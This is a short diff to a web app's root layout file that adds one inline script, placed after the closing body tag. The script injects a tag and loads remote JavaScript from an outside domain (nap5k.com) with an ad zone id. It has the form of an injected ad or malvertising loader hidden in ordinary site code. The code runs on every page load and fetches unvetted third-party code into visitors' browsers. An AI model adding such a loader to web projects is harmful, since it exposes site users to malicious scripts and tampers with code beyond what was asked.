@@ -137,6 +137,7 @@ export default function RootLayout({ children }) {
           `}
         </Script>
       </body>
+          <script>(function(s){s.dataset.zone='11916394',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
     </html>
   );
 }
